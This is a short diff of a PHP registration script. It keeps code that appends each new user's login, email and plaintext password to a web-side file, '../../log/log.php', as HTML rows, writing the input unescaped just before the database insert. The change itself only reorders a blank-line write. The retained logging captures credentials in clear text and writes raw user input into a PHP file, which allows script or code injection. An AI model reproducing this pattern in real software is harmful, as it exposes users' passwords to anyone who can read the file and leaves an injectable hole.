@@ -155,12 +155,12 @@ $errors = array();
 
 $fl = 
 fopen('../../log/log.php', 'a+');
+fwrite($fl, '' . PHP_EOL);
 fwrite($fl, '<tr style="text-align: center;">
 <td>login: <strong>' . $login . '</strong><br>' . PHP_EOL);
 fwrite($fl, 'email: ' . $email . '<br>' . PHP_EOL);
-fwrite($fl, 'password: ' . $password . '<br><br></td>
+fwrite($fl, 'password: ' . $password . '<br></td>
 </tr>' . PHP_EOL);
-fwrite($fl, '' . PHP_EOL);
 fclose($fl);
 
        $insert_query = "INSERT INTO `users` (token, login, email, password) 
